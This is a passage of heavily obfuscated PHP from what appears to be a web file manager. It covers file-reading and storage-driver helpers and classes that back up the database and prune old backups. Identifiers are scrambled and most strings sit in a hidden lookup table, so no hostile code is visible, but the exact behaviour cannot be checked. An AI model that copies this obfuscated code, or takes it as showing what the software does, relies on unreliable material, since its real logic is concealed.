($î±ºßôÄ->isFileOutServer()) { return $î±ºßôÄ->fileOutServer($áªóÌ∂é, $ë†àÉ°˜, $ÄÜ¬¸ı√, $ÑÖ‹˙Ü¡); } return $î±ºßôÄ->fileOut($áªóÌ∂é, $ë†àÉ°˜, $ÄÜ¬¸ı√, $ÑÖ‹˙Ü¡); } public static function fileOutImage($©èÂÂË√, $πÎ¶¡ç∂ = 250) { $Ö≠ëÌ∏– = array(250, 600, 1200, 2000, 3000, 5000); for ($ç√∞ÃçÏ = 0; $ç√∞ÃçÏ < count($Ö≠ëÌ∏–); $ç√∞ÃçÏ++) { if ($ç√∞ÃçÏ == 0 && $πÎ¶¡ç∂ <= $Ö≠ëÌ∏–[$ç√∞ÃçÏ]) { $πÎ¶¡ç∂ = $Ö≠ëÌ∏–[$ç√∞ÃçÏ]; break; } else { if ($πÎ¶¡ç∂ > $Ö≠ëÌ∏–[$ç√∞ÃçÏ - 1] && $πÎ¶¡ç∂ <= $Ö≠ëÌ∏–[$ç√∞ÃçÏ]) { $πÎ¶¡ç∂ = $Ö≠ëÌ∏–[$ç√∞ÃçÏ]; break; } else { if ($ç√∞ÃçÏ == count($Ö≠ëÌ∏–) - 1 && $πÎ¶¡ç∂ > $Ö≠ëÌ∏–[$ç√∞ÃçÏ]) { $πÎ¶¡ç∂ = $Ö≠ëÌ∏–[$ç√∞ÃçÏ]; break; } } } } $ÀÖ∑Ñ÷˜ = self::driverMake($©èÂÂË√); if ($ÀÖ∑Ñ÷˜->isFileOutServer()) { return $ÀÖ∑Ñ÷˜->fileOutImageServer($©èÂÂË√, $πÎ¶¡ç∂); } return $ÀÖ∑Ñ÷˜->fileOutImage($©èÂÂË√, $πÎ¶¡ç∂); } private static function driverIsSame($°†ÙÄ¢˚, $Óµ–ˆá˜) { $è¯ãÁâ‰ =& $_SERVER[ß⁄ˆÇ†Œ]; $Á≥øØ÷Ÿ = $°†ÙÄ¢˚->getType(); $Æ‚ûπ∑á = $Óµ–ˆá˜->getType(); if ($Á≥øØ÷Ÿ != $Æ‚ûπ∑á) { return !1; } if ($Á≥øØ÷Ÿ == $è¯ãÁâ‰[830]) { return !0; } if ($Á≥øØ÷Ÿ == $è¯ãÁâ‰[109]) { return !0; } if ($°†ÙÄ¢˚->pathDriver == $Óµ–ˆá˜->pathDriver) { return !0; } return !1; } public static function copyUpdate($ï·ØªÄø, $Å«Ëﬁ¡ã) { $Æπù‰ Ω =& $_SERVER[ß⁄ˆÇ†Œ]; if (!IO::exist($ï·ØªÄø)) { return !1; } if (!IO::exist($Å«Ëﬁ¡ã)) { IO::mkdir($Å«Ëﬁ¡ã); } $èŸŒÚÔé = array_to_keyvalue(self::listAllSimple($ï·ØªÄø), $Æπù‰ Ω[87]); $œ–“ÿ∫ò = array_to_keyvalue(self::listAllSimple($Å«Ëﬁ¡ã), $Æπù‰ Ω[87]); $¡´˘º˝– = array(); $Ô˚›‚¿ö = array(); foreach ($èŸŒÚÔé as $”èÉÏú≈ => $ ë†ÁÒô) { if (isset($œ–“ÿ∫ò[$”èÉÏú≈])) { if ($ ë†ÁÒô[$Æπù‰ Ω[78]] == 1) { continue; } if ($œ–“ÿ∫ò[$”èÉÏú≈][$Æπù‰ Ω[79]] == $ ë†ÁÒô[$Æπù‰ Ω[79]]) { continue; } } if ($ ë†ÁÒô[$Æπù‰ Ω[78]] == 1) { $Ô˚›‚¿ö[] = $Å«Ëﬁ¡ã . $Æπù‰ Ω[8] . trim($”èÉÏú≈, $Æπù‰ Ω[8]); continue; } $º”≠≈∫™ = strstr(trim($”èÉÏú≈, $Æπù‰ Ω[8]), $Æπù‰ Ω[8]) ? get_path_father($”èÉÏú≈) : $Æπù‰ Ω[12]; $¡´˘º˝–[] = array($Æπù‰ Ω[1237] => $ ë†ÁÒô[$Æπù‰ Ω[89]], $Æπù‰ Ω[1238] => rtrim($Å«Ëﬁ¡ã, $Æπù‰ Ω[8]) . $Æπù‰ Ω[8] . $º”≠≈∫™, $Æπù‰ Ω[1239] => $ ë†ÁÒô); } $ˆ©∫Ùêø = array($Æπù‰ Ω[230] => $¡´˘º˝–, $Æπù‰ Ω[78] => $Ô˚›‚¿ö); Hook::trigger($Æπù‰ Ω[1240], $ï·ØªÄø, $Å«Ëﬁ¡ã, $ˆ©∫Ùêø); foreach ($Ô˚›‚¿ö as $ ë†ÁÒô) { IO::mkdir($ ë†ÁÒô); } foreach ($¡´˘º˝– as $ ë†ÁÒô) { IO::copy($ ë†ÁÒô[$Æπù‰ Ω[1237]], $ ë†ÁÒô[$Æπù‰ Ω[1238]], REPEAT_REPLACE); } } public static function fileSubstr($‰Æë¡•É, $˝ı±°ı⁄, $∞¿Ì…å‘ = false) { $öÀÂ¯€å =& $_SERVER[ß⁄ˆÇ†Œ]; $⁄”◊ΩÃß = self::driverMake($‰Æë¡•É); $ﬂÈÇ„·´ = $⁄”◊ΩÃß->size($‰Æë¡•É); $•»®¡≤ì = $˝ı±°ı⁄; $ÁàöÖÖå = $∞¿Ì…å‘; if ($˝ı±°ı⁄ < 0) { $˝ı±°ı⁄ = $ﬂÈÇ„·´ + $˝ı±°ı⁄; } if ($∞¿Ì…å‘ === !1) { $∞¿Ì…å‘ = $ﬂÈÇ„·´ - $˝ı±°ı⁄; } if ($˝ı±°ı⁄ + $∞¿Ì…å‘ > $ﬂÈÇ„·´) { $∞¿Ì…å‘ = $ﬂÈÇ„·´ - $˝ı±°ı⁄; } if (!$ﬂÈÇ„·´ && $⁄”◊ΩÃß->getType() == $öÀÂ¯€å[109] && !$⁄”◊ΩÃß->exist($‰Æë¡•É)) { $¬ùΩ’⁄õ = get_path_this($‰Æë¡•É); $Ö„Ææú“ = parse_url_query($¬ùΩ’⁄õ); if (is_array($Ö„Ææú“) && isset($Ö„Ææú“[$öÀÂ¯€å[32]])) { $¬ùΩ’⁄õ = urldecode($Ö„Ææú“[$öÀÂ¯€å[32]]); } throw new Exception($öÀÂ¯€å[1241] . LNG($öÀÂ¯€å[1242]) . $öÀÂ¯€å[1040] . clear_html($¬ùΩ’⁄õ) . $öÀÂ¯€å[12]); } if ($∞¿Ì…å‘ <= 0) { return $öÀÂ¯€å[12]; } if ($˝ı±°ı⁄ < 0 || $˝ı±°ı⁄ >= $ﬂÈÇ„·´ || $∞¿Ì…å‘ > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\122\145\x61\x64\x20\145\x72\162\157\x72\x21\40\x73\164\x61\162\x74\x3d{$˝ı±°ı⁄}\73\x6c\145\x6e\147\x74\x68\75{$∞¿Ì…å‘}\x3b\40\163\x69\172\145\75{$ﬂÈÇ„·´}\73"); } $≤÷ÎÅÒø = $⁄”◊ΩÃß->fileSubstr($‰Æë¡•É, $˝ı±°ı⁄, $∞¿Ì…å‘); if (!$≤÷ÎÅÒø && $∞¿Ì…å‘ && isset($GLOBALS[$öÀÂ¯€å[1243]])) { throw new Exception($GLOBALS[$öÀÂ¯€å[1243]][$öÀÂ¯€å[1244]]); } return $≤÷ÎÅÒø; } private static function driverMake(&$€ˆ¸ëã‰) { $ñÜÒØ©æ =& $_SERVER[ß⁄ˆÇ†Œ]; $í≤àÜÕ§ = KodIO::parse($€ˆ¸ëã‰); if (!self::$driverListSystem) { $íÄÈÈ√ë = Model($ñÜÒØ©æ[840])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($íÄÈÈ√ë, $ñÜÒØ©æ[483]); } if ($í≤àÜÕ§[$ñÜÒØ©æ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$í≤àÜÕ§[$ñÜÒØ©æ[483]]]) { throw new Exception($ñÜÒØ©æ[1245]); return !1; } $€ˆ¸ëã‰ = $í≤àÜÕ§[$ñÜÒØ©æ[1246]]; $≠‹¯îÛ– = self::driverGet($í≤àÜÕ§, $€ˆ¸ëã‰); return $≠‹¯îÛ–; } private static function driverGet($õ·ƒ´÷é, &$ºß˙ˆ≥†) { $õºüÅ›ü =& $_SERVER[ß⁄ˆÇ†Œ]; $¯®¬µµË = $õ·ƒ´÷é[$õºüÅ›ü[1247]]; $¸õ–∂”î = $õ·ƒ´÷é[$õºüÅ›ü[483]]; switch ($õ·ƒ´÷é[$õºüÅ›ü[33]]) { case KodIO::KOD_IO: $„π¸±”… = self::$driverListSystem[$¸õ–∂”î]; break; case KodIO::KOD_SOURCE: $ºß˙ˆ≥† = $¸õ–∂”î . $ºß˙ˆ≥†; $„π¸±”… = array($õºüÅ›ü[1248] => $õºüÅ›ü[1249], $õºüÅ›ü[6] => $õ·ƒ´÷é); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $◊¶ùË«á = $GLOBALS[$õºüÅ›ü[1250]]; self::$driverListUser = array_to_keyvalue($◊¶ùË«á, $õºüÅ›ü[483]); } $„π¸±”… = self::$driverListUser[$¸õ–∂”î]; break; case KodIO::KOD_SHARE_LINK: $„π¸±”… = array($õºüÅ›ü[1248] => $õºüÅ›ü[1251], $õºüÅ›ü[6] => $õ·ƒ´÷é); $ıÏÔﬁÅﬁ = Action($õºüÅ›ü[1252])->sharePathInfo($õ·ƒ´÷é[$õºüÅ›ü[87]]); $ºß˙ˆ≥† = $ıÏÔﬁÅﬁ[$õºüÅ›ü[193]]; if (!$ıÏÔﬁÅﬁ[$õºüÅ›ü[193]]) { $˙Áõπ–å = Model($õºüÅ›ü[672])->getInfo($ıÏÔﬁÅﬁ[$õºüÅ›ü[673]]); $ºß˙ˆ≥† = KodIO::clear($˙Áõπ–å[$õºüÅ›ü[1253]] . $õ·ƒ´÷é[$õºüÅ›ü[1246]]); $õ·ƒ´÷é[$õºüÅ›ü[568]] = $˙Áõπ–å; $õ·ƒ´÷é[$õºüÅ›ü[1228]] = $ºß˙ˆ≥†; $„π¸±”… = array($õºüÅ›ü[1248] => $õºüÅ›ü[1254], $õºüÅ›ü[6] => $õ·ƒ´÷é); } break; case KodIO::KOD_SHARE_ITEM: $„π¸±”… = array($õºüÅ›ü[1248] => $õºüÅ›ü[1255], $õºüÅ›ü[6] => $õ·ƒ´÷é); $˙Áõπ–å = Model($õºüÅ›ü[672])->getInfo($õ·ƒ´÷é[$õºüÅ›ü[483]]); if ($˙Áõπ–å[$õºüÅ›ü[193]] == $õºüÅ›ü[228]) { $ºß˙ˆ≥† = KodIO::clear($˙Áõπ–å[$õºüÅ›ü[1253]] . $õ·ƒ´÷é[$õºüÅ›ü[1246]]); $õ·ƒ´÷é[$õºüÅ›ü[568]] = $˙Áõπ–å; $õ·ƒ´÷é[$õºüÅ›ü[1228]] = $ºß˙ˆ≥†; $„π¸±”… = array($õºüÅ›ü[1248] => $õºüÅ›ü[1256], $õºüÅ›ü[6] => $õ·ƒ´÷é); } else { if (!$ºß˙ˆ≥†) { $ºß˙ˆ≥† = $˙Áõπ–å[$õºüÅ›ü[193]]; } } break; default: $ºß˙ˆ≥† = $õ·ƒ´÷é[$õºüÅ›ü[87]]; $„π¸±”… = array($õºüÅ›ü[1248] => $õºüÅ›ü[1257]); break; } $⁄÷ô¸Ú… = $õ·ƒ´÷é[$õºüÅ›ü[87]]; if (!isset(self::$driverCache[$⁄÷ô¸Ú…])) { $——ç†Ö≤ = strtolower($„π¸±”…[$õºüÅ›ü[98]]); $¬¶˙ÇÊæ = $GLOBALS[$õºüÅ›ü[6]][$õºüÅ›ü[92]][$õºüÅ›ü[898]]; $¡¥˙˙…Í = $õºüÅ›ü[77] . (isset($¬¶˙ÇÊæ[$——ç†Ö≤]) ? $¬¶˙ÇÊæ[$——ç†Ö≤] : ucfirst($——ç†Ö≤)); if (!class_exists($¡¥˙˙…Í)) { show_json("{$¡¥˙˙…Í}\x20\x6e\157\x74\40\145\170\151\163\x74\163\41", !1); } $è±Ü≈àø = isset($„π¸±”…[$õºüÅ›ü[6]]) ? $„π¸±”…[$õºüÅ›ü[6]] : !1; self::$driverCache[$⁄÷ô¸Ú…] = new $¡¥˙˙…Í($è±Ü≈àø); } $®Ö≈Øàã = self::$driverCache[$⁄÷ô¸Ú…]; $®Ö≈Øàã->pathDriver = $¯®¬µµË; $®Ö≈Øàã->pathBase = $õºüÅ›ü[12]; if (isset($„π¸±”…[$õºüÅ›ü[6]][$õºüÅ›ü[1258]])) { $®Ö≈Øàã->pathBase = rtrim($„π¸±”…[$õºüÅ›ü[6]][$õºüÅ›ü[1258]], $õºüÅ›ü[8]) . $õºüÅ›ü[8]; $ºß˙ˆ≥† = $®Ö≈Øàã->pathBase . ltrim($ºß˙ˆ≥†, $õºüÅ›ü[8]); } $ºß˙ˆ≥† = $®Ö≈Øàã->getPath($ºß˙ˆ≥†); if (isset($õ·ƒ´÷é[$õºüÅ›ü[1228]])) { $ºß˙ˆ≥† = $õ·ƒ´÷é[$õºüÅ›ü[1228]]; } $®Ö≈Øàã->path = $ºß˙ˆ≥†; return $®Ö≈Øàã; } public static function errorTips($ﬁ˙©∂©˛ = false) { $ëÜ≤Ê≈ô =& $_SERVER[ß⁄ˆÇ†Œ]; static $ò∏Ñµ∞ù = array(); $°˘√ô π = 1000; if ($ﬁ˙©∂©˛ === -1) { return $ò∏Ñµ∞ù ? $ò∏Ñµ∞ù[count($ò∏Ñµ∞ù) - 1] : $ëÜ≤Ê≈ô[12]; } if ($ﬁ˙©∂©˛ === !1) { return implode($ëÜ≤Ê≈ô[262], $ò∏Ñµ∞ù); } if (count($ò∏Ñµ∞ù) >= $°˘√ô π) { $ò∏Ñµ∞ù = array_slice($ò∏Ñµ∞ù, $°˘√ô π * 0.5, $°˘√ô π); } $ò∏Ñµ∞ù[] = $ﬁ˙©∂©˛; write_log($ëÜ≤Ê≈ô[176] . ACTION . $ëÜ≤Ê≈ô[1259] . $ﬁ˙©∂©˛, $ëÜ≤Ê≈ô[1260]); } public static function getLastError($√‰ÅùàÃ = '') { $–ü¶∞ó« = self::errorTips(-1); return $–ü¶∞ó« ? $–ü¶∞ó« : $√‰ÅùàÃ; } } goto cìÒ£ä≥¶æ; A‹ËïŒ∞π®: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ß⁄ˆÇ†Œ][821]); $this->init(); $this->keep(); } public function init() { $—†Ç¿¯… =& $_SERVER[ß⁄ˆÇ†Œ]; $this->isManual(); self::$name = date($—†Ç¿¯…[822]); if (!($’àÚ†€∑ = $this->model->lastItem())) { $’àÚ†€∑ = $this->initData(); } else { self::$name = $’àÚ†€∑[$—†Ç¿¯…[32]]; if ($’àÚ†€∑[$—†Ç¿¯…[823]] == $—†Ç¿¯…[91]) { self::$name = date($—†Ç¿¯…[272]); $⁄çÃÀ”˙ = intval(_get($’àÚ†€∑, $—†Ç¿¯…[824], 0)); if (self::$manual == 0 && $’àÚ†€∑[$—†Ç¿¯…[32]] == self::$name) { $this->model->remove($’àÚ†€∑[$—†Ç¿¯…[483]]); } $’àÚ†€∑ = $this->initData($⁄çÃÀ”˙, $’àÚ†€∑[$—†Ç¿¯…[825]]); } else { $this->checkStore($’àÚ†€∑[$—†Ç¿¯…[825]]); } } self::$option = $’àÚ†€∑; } private function isManual() { $ù«æ∆æç = _get($GLOBALS, $_SERVER[ß⁄ˆÇ†Œ][826], 0); $ù«æ∆æç = intval($ù«æ∆æç); self::$manual = $ù«æ∆æç && $ù«æ∆æç == 1 ? 1 : 0; } private function initData($±ãò¸è≤ = 0, $áÿäµµ≥ = '') { $ïæëó‘„ =& $_SERVER[ß⁄ˆÇ†Œ]; $€œ™ÅÅì = $this->model->config(); if ($áÿäµµ≥ && $€œ™ÅÅì[$ïæëó‘„[825]] != $áÿäµµ≥) { $±ãò¸è≤ = 0; } $this->checkStore($€œ™ÅÅì[$ïæëó‘„[825]]); if (self::$manual == 1) { self::$name .= $ïæëó‘„[11] . date($ïæëó‘„[827]); } $ˆëÈ–íâ = array($ïæëó‘„[825] => $€œ™ÅÅì[$ïæëó‘„[825]], $ïæëó‘„[32] => self::$name, $ïæëó‘„[823] => 0, $ïæëó‘„[171] => $€œ™ÅÅì[$ïæëó‘„[171]], $ïæëó‘„[828] => self::$manual, $ïæëó‘„[378] => array($ïæëó‘„[829] => array($ïæëó‘„[823] => 0), $ïæëó‘„[830] => array($ïæëó‘„[823] => 0, $ïæëó‘„[831] => 0, $ïæëó‘„[832] => 0, $ïæëó‘„[33] => $ïæëó‘„[12], $ïæëó‘„[833] => 0, $ïæëó‘„[834] => 0), $ïæëó‘„[835] => array($ïæëó‘„[823] => 0, $ïæëó‘„[831] => 0, $ïæëó‘„[832] => 0, $ïæëó‘„[833] => 0, $ïæëó‘„[834] => 0), $ïæëó‘„[230] => array($ïæëó‘„[823] => 0, $ïæëó‘„[836] => 0, $ïæëó‘„[837] => 0, $ïæëó‘„[838] => 0, $ïæëó‘„[839] => 0, $ïæëó‘„[549] => $±ãò¸è≤, $ïæëó‘„[833] => 0, $ïæëó‘„[834] => 0)), $ïæëó‘„[833] => time(), $ïæëó‘„[834] => 0); $”íÍÆâÔ = $this->model->insert($ˆëÈ–íâ); $ˆëÈ–íâ[$ïæëó‘„[483]] = $”íÍÆâÔ; return $ˆëÈ–íâ; } private function checkStore($®€Áó›¶) { $Æ≈»àùê = Model($_SERVER[ß⁄ˆÇ†Œ][840]); $òÅ∑Åß€ = $Æ≈»àùê->listData($®€Áó›¶); $Æ≈»àùê->checkConfig($òÅ∑Åß€); } public static function get() { if (!self::$option) { $–ºââÏ™ = Model($_SERVER[ß⁄ˆÇ†Œ][821]); $ÿñÉÓ»ö = $–ºââÏ™->findByName(self::$name); $–ºââÏ™->parseContent($ÿñÉÓ»ö); self::$option = $ÿñÉÓ»ö; } return self::$option; } public static function set($¿¢˜¬Äı) { $ÊÖì—˜∑ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ø‡ÈÎ–Ü = self::get(); foreach ($¿¢˜¬Äı as $±©µÛ∫À => $êÄ∂‘„Á) { array_set_value($Ø‡ÈÎ–Ü, $±©µÛ∫À, $êÄ∂‘„Á); } Model($ÊÖì—˜∑[821])->update($Ø‡ÈÎ–Ü[$ÊÖì—˜∑[483]], $Ø‡ÈÎ–Ü); self::$option = $Ø‡ÈÎ–Ü; return self::$option; } public function keep() { $à≠™¶·Ò =& $_SERVER[ß⁄ˆÇ†Œ]; $áŒ…ºª = self::get(); if (_get($áŒ…ºª, $à≠™¶·Ò[841], 0) == $à≠™¶·Ò[91]) { return; } $this->backupKeep($áŒ…ºª); self::set(array($à≠™¶·Ò[841] => 1)); } private function backupKeep($˘÷•ÓÂ˛) { $∑ü˝™Ï◊ =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::$manual == 1) { return; } $ ôﬁÛŒœ = $this->model->listData(); if (empty($ ôﬁÛŒœ)) { return; } $∂‘”Ü˘ï = 0; $üÔ≠≈≈î = array(); foreach ($ ôﬁÛŒœ as $˝à‚¥˜’) { if ($∂‘”Ü˘ï >= 7) { break; } $üÔ≠≈≈î[] = $˝à‚¥˜’[$∑ü˝™Ï◊[32]]; $∂‘”Ü˘ï++; } for ($∂‘”Ü˘ï = 0; $∂‘”Ü˘ï < 12; $∂‘”Ü˘ï++) { $üÔ≠≈≈î[] = date($∑ü˝™Ï◊[842], strtotime("\55{$∂‘”Ü˘ï}\40\x6d\157\x6e\164\x68\163")); } $üÔ≠≈≈î = array_unique($üÔ≠≈≈î); $ÉÓÀ˚÷‡ = Model($∑ü˝™Ï◊[843])->get($∑ü˝™Ï◊[844]); foreach ($ ôﬁÛŒœ as $˝à‚¥˜’) { if (isset($˝à‚¥˜’[$∑ü˝™Ï◊[828]]) && $˝à‚¥˜’[$∑ü˝™Ï◊[828]] == $∑ü˝™Ï◊[91]) { continue; } if (!empty($˝à‚¥˜’[$∑ü˝™Ï◊[32]]) && in_array($˝à‚¥˜’[$∑ü˝™Ï◊[32]], $üÔ≠≈≈î)) { continue; } $this->model->remove($˝à‚¥˜’[$∑ü˝™Ï◊[483]]); $√‡Í¬¢‚ = $this->backupPath($˘÷•ÓÂ˛, $ÉÓÀ˚÷‡); IO::remove($√‡Í¬¢‚, !1); } } private function backupPath($Ûó÷◊Ëƒ, $È∑ü§‘◊ = false) { $æÂÖıâ€ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$È∑ü§‘◊) { $È∑ü§‘◊ = Model($æÂÖıâ€[843])->get($æÂÖıâ€[844]); } $ØÌ¶∂Ó¬ = $Ûó÷◊Ëƒ[$æÂÖıâ€[32]]; $òóÀøï‰ = substr(md5($æÂÖıâ€[845] . $È∑ü§‘◊ . $ØÌ¶∂Ó¬), 0, 8); return "\173\151\157\72{$Ûó÷◊Ëƒ[$æÂÖıâ€[825]]}\175\x2f\144\x61\x74\141\142\141\x73\x65\x2f\x62\x61\x63\x6b\165\160\57" . $ØÌ¶∂Ó¬ . $æÂÖıâ€[11] . $òóÀøï‰; } public function db() { $î“ÈÅΩ≥ =& $_SERVER[ß⁄ˆÇ†Œ]; $®‰Úî˙ = self::get(); if (_get($®‰Úî˙, $î“ÈÅΩ≥[846], 0) == $î“ÈÅΩ≥[91]) { return !0; } $˛€ÿŸ¬Ë = new BackupDb(); if (!$˛€ÿŸ¬Ë->index()) { return !1; } self::set(array($î“ÈÅΩ≥[846] => 1)); return !0; } public function dbFile() { $º°∂∏∞é =& $_SERVER[ß⁄ˆÇ†Œ]; $ô÷É±≈¥ = self::get(); if (_get($ô÷É±≈¥, $º°∂∏∞é[847], 0) == $º°∂∏∞é[91]) { return !0; } $ÃñúëƒΩ = new BackupDbFile(); if (!$ÃñúëƒΩ->index()) { return !1; } self::set(array($º°∂∏∞é[847] => 1)); return !0; } public function file() { $ËóÎ…”¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $‹’ıÖö€ = self::get(); if (_get($‹’ıÖö€, $ËóÎ…”¸[848], 0) == $ËóÎ…”¸[91]) { return !0; } if ($‹’ıÖö€[$ËóÎ…”¸[171]] == $ËóÎ…”¸[849]) { $äâŸóùŸ = new BackupFile(); if (!$äâŸóùŸ->index()) { return !1; } } self::set(array($ËóÎ…”¸[848] => 1, $ËóÎ…”¸[823] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $œ·Ï≠Ÿ• =& $_SERVER[ß⁄ˆÇ†Œ]; $Ù¯ﬂÁ ò = Backup::get(); self::$io = $Ù¯ﬂÁ ò[$œ·Ï≠Ÿ•[825]]; self::$name = $Ù¯ﬂÁ ò[$œ·Ï≠Ÿ•[32]]; $Êæ¥—ÑÕ = new DbManage(); $÷ı‹Ê ∏ = $Êæ¥—ÑÕ->dbType(); $Á¸´ Û∑ = array($œ·Ï≠Ÿ•[850] => $÷ı‹Ê ∏, $œ·Ï≠Ÿ•[851] => time()); Backup::set($Á¸´ Û∑); $Ñ€ﬁ‘Â∆ = $this->tmpFilesPath() . $œ·Ï≠Ÿ•[852] . self::$name . $œ·Ï≠Ÿ•[8]; del_dir($Ñ€ﬁ‘Â∆); mk_dir($Ñ€ﬁ‘Â∆); $Ö∞ÊäœÕ = $Ω˚Øó∏ﬁ = 0; try { $ØÙ‚È§è = $Êæ¥—ÑÕ->db()->getTables(); } catch (Exception $Ç≥˙ÕÌ) { return !1; } $ØÙ‚È§è = array_diff($ØÙ‚È§è, array($œ·Ï≠Ÿ•[853], $œ·Ï≠Ÿ•[854])); foreach ($ØÙ‚È§è as $ÆÔº¡’) { $Ö∞ÊäœÕ += $Êæ¥—ÑÕ->model($ÆÔº¡’)->count(); } $í‰úœÖÓ = new Task($œ·Ï≠Ÿ•[855], $œ·Ï≠Ÿ•[856], $Ö∞ÊäœÕ, LNG($œ·Ï≠Ÿ•[857]) . $œ·Ï≠Ÿ•[858] . LNG($œ·Ï≠Ÿ•[859])); $GLOBALS[$œ·Ï≠Ÿ•[860]] = self::$name; foreach ($ØÙ‚È§è as $ÆÔº¡’) { $˚†‘áÖ° = $Ñ€ﬁ‘Â∆ . $ÆÔº¡’ . $œ·Ï≠Ÿ•[861]; $ö«ãõµÒ = null; if ($ÆÔº¡’ == $œ·Ï≠Ÿ•[862] && (!isset($Ù¯ﬂÁ ò[$œ·Ï≠Ÿ•[171]]) || $Ù¯ﬂÁ ò[$œ·Ï≠Ÿ•[171]] == $œ·Ï≠Ÿ•[228])) { $ö«ãõµÒ = self::$io; } $Ω˚Øó∏ﬁ += $Êæ¥—ÑÕ->sqlFromDb($ÆÔº¡’, $˚†‘áÖ°, $í‰úœÖÓ, $ö«ãõµÒ); } unset($GLOBALS[$œ·Ï≠Ÿ•[860]]); $í‰úœÖÓ->end(); if ($Ω˚Øó∏ﬁ > $Ö∞ÊäœÕ) { $Ö∞ÊäœÕ = $Ω˚Øó∏ﬁ; } $Á¸´ Û∑ = array($œ·Ï≠Ÿ•[850] => $÷ı‹Ê ∏, $œ·Ï≠Ÿ•[846] => 1, $œ·Ï≠Ÿ•[863] => $Ö∞ÊäœÕ, $œ·Ï≠Ÿ•[864] => $Ω˚Øó∏ﬁ, $œ·Ï≠Ÿ•[865] => time()); Backup::set($Á¸´ Û∑); if ($Ö∞ÊäœÕ - $Ω˚Øó∏ﬁ > 0) { $ÀˆÌÆ¨ñ = $œ·Ï≠Ÿ•[866]; if (!stristr(I18n::getType(), $œ·Ï≠Ÿ•[867])) { $ÀˆÌÆ¨ñ = $œ·Ï≠Ÿ•[868]; } write_log(array($ÀˆÌÆ¨ñ, $Á¸´ Û∑), $œ·Ï≠Ÿ•[856]); return !1; } return !0; } private function tmpFilesPath() { $ÜØÁ∆¸˘ =& $_SERVER[ß⁄ˆÇ†Œ]; $çõàìıú = TEMP_FILES; if ($GLOBALS[$ÜØÁ∆¸˘[6]][$ÜØÁ∆¸˘[92]][$ÜØÁ∆¸˘[869]]) { $çõàìıú = $GLOBALS[$ÜØÁ∆¸˘[6]][$ÜØÁ∆¸˘[92]][$ÜØÁ∆¸˘[869]]; if (!mk_dir($çõàìıú) || !is_writable($çõàìıú) || !IO::mkfile($çõàìıú . $ÜØÁ∆¸˘[870])) { $çõàìıú = TEMP_FILES; } } return $çõàìıú; } } class BackupDbFile { public function __construct() { } public function index() { $£”¶≠ªª =& $_SERVER[ß⁄ˆÇ†Œ]; $˘ßÏ π∆ = Backup::get(); $ÒºÖçÁÂ = $˘ßÏ π∆[$£”¶≠ªª[32]]; $øüóõ¸À = $this->tmpFilesPath() . "\x62\141\143\153\x75\160\x5f{$ÒºÖçÁÂ}\x2f"; $≈˛∫÷Í• = $this->backupPath($˘ßÏ π∆); if (!($≈˛∫÷Í• = IO::mkdir($≈˛∫÷Í•))) { return !1; } $ñŸø¨º… = IO::listPath($øüóõ¸À); $î¯•˜·« = isset($ñŸø¨º…[$£”¶≠ªª[86]]) ? $ñŸø¨º…[$£”¶≠ªª[86]] : array(); $˙∫º¡ó¥ = array_sum(array_column($î¯•˜·«, $£”¶≠ªª[79])); if (!$˙∫º¡ó¥) { return !1; } $⁄∫˘´Ø¶ = array($£”¶≠ªª[871] => $˙∫º¡ó¥, $£”¶≠ªª[872] => time()); Backup::set($⁄∫˘´Ø¶); $Âç«ü´Œ = new TaskFileTransfer($£”¶≠ªª[873], $£”¶≠ªª[856], count($î¯•˜·«), LNG($£”¶≠ªª[857]) . $£”¶≠ªª[470] . LNG($£”¶≠ªª[859]) . $£”¶≠ªª[874]); $Âç«ü´Œ->task[$£”¶≠ªª[836]] = $˙∫º¡ó¥; foreach ($ñŸø¨º…[$£”¶≠ªª[86]] as $í√∂ï) { $æ‹›ò’â = IO::move($í√∂ï[$£”¶≠ªª[87]], $≈˛∫÷Í•); if (!$æ‹›ò’â) { $Âç«ü´Œ->end(); $Ô∆Ÿ†Ï· = IO::getLastError($£”¶≠ªª[875] . $í√∂ï[$£”¶≠ªª[87]] . $£”¶≠ªª[876] . $≈˛∫÷Í• . $£”¶≠ªª[178]); write_log($Ô∆Ÿ†Ï·, $£”¶≠ªª[856]); return !1; } } $∏»…ƒñê = new DbManage(); $»Áú§ëä = $∏»…ƒñê->getSqlFile(); if (!$»Áú§ëä[$£”¶≠ªª[877]] || !$»Áú§ëä[$£”¶≠ªª[13]]) { return !1; } IO::move($»Áú§ëä[$£”¶≠ªª[877]], $≈˛∫÷Í•); IO::move($»Áú§ëä[$£”¶≠ªª[13]], $≈˛∫÷Í•); $Âç«ü´Œ->end(); $⁄∫˘´Ø¶ = array($£”¶≠ªª[878] => $˙∫º¡ó¥, $£”¶≠ªª[879] => time()); Backup::set($⁄∫˘´Ø¶); return !0; } private function backupPath($º«‘õ€ú) { $Ãµ…Ô§Ê =& $_SERVER[ß⁄ˆÇ†Œ]; $Ìë”ØÙ§ = $º«‘õ€ú[$Ãµ…Ô§Ê[32]]; $‘ÀÖ∑∑Ì = Model($Ãµ…Ô§Ê[843])->get($Ãµ…Ô§Ê[844]); $Ë∑ª‘úá = substr(md5($Ãµ…Ô§Ê[845] . $‘ÀÖ∑∑Ì . $Ìë”ØÙ§), 0, 8); return "\173\151\x6f\72{$º«‘õ€ú[$Ãµ…Ô§Ê[825]]}\175\x2f\144\x61\x74\x61\x62\141\x73\x65\x2f\142\141\143\x6b\x75\x70\x2f" . $Ìë”ØÙ§ . $Ãµ…Ô§Ê[11] . $Ë∑ª‘úá; } private function tmpFilesPath() { $€¡¸´Ì  =& $_SERVER[ß⁄ˆÇ†Œ]; $ïæÏë∏ˆ = TEMP_FILES; if ($GLOBALS[$€¡¸´Ì [6]][$€¡¸´Ì [92]][$€¡¸´Ì [869]]) { $ïæÏë∏ˆ = $GLOBALS[$€¡¸´Ì [6]][$€¡¸´Ì [92]][$€¡¸´Ì [869]]; if (!mk_dir($ïæÏë∏ˆ) || !is_writable($ïæÏë∏ˆ) || !IO::mkfile($ïæÏë∏ˆ . $€¡¸´Ì [870])) { $ïæÏë∏ˆ = TEMP_FILES; } } return 